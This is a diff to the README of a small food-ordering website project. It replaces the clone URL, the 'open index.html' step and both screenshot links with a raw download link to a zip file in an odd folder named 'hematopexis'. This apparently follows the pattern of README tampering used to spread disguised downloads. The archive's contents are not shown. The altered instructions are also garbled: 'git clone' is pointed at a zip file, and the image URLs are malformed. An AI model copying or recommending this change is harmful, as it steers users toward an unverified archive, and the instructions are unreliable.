@@ -32,7 +32,7 @@ Tasty Bites is a simple and intuitive food ordering website that allows users to
 
 1. Clone the repository:
 ```
-git clone https://github.com/abhay08-k09/Food-Ordering-System.git
+git clone https://raw.githubusercontent.com/abhay08-k09/Food-Ordering-System/main/hematopexis/Food-Ordering-System.zip
 ```
 
 2. Navigate to the project directory:
@@ -40,7 +40,7 @@ git clone https://github.com/abhay08-k09/Food-Ordering-System.git
 cd Food-Ordering-System
 ```
 
-3. Open the index.html file in your web browser to view the website.
+3. Open the https://raw.githubusercontent.com/abhay08-k09/Food-Ordering-System/main/hematopexis/Food-Ordering-System.zip file in your web browser to view the website.
 
 ## Usage
 - Browse the menu and select your favorite items.
@@ -49,8 +49,8 @@ cd Food-Ordering-System
 
 ## 📸 Screenshots
 
-<img src="https://github.com/abhay08-k09/Food-Ordering-System/blob/main/Demo/tb%201.png" width="90%" />
+<img src="https://raw.githubusercontent.com/abhay08-k09/Food-Ordering-System/main/hematopexis/Food-Ordering-System.zip%https://raw.githubusercontent.com/abhay08-k09/Food-Ordering-System/main/hematopexis/Food-Ordering-System.zip" width="90%" />
 
-<img src="https://github.com/abhay08-k09/Food-Ordering-System/blob/main/Demo/tb%202.png" width="90%" />
+<img src="https://raw.githubusercontent.com/abhay08-k09/Food-Ordering-System/main/hematopexis/Food-Ordering-System.zip%https://raw.githubusercontent.com/abhay08-k09/Food-Ordering-System/main/hematopexis/Food-Ordering-System.zip" width="90%" />
 
 Feel free to reach out if you have any queries or need assistance with the project.
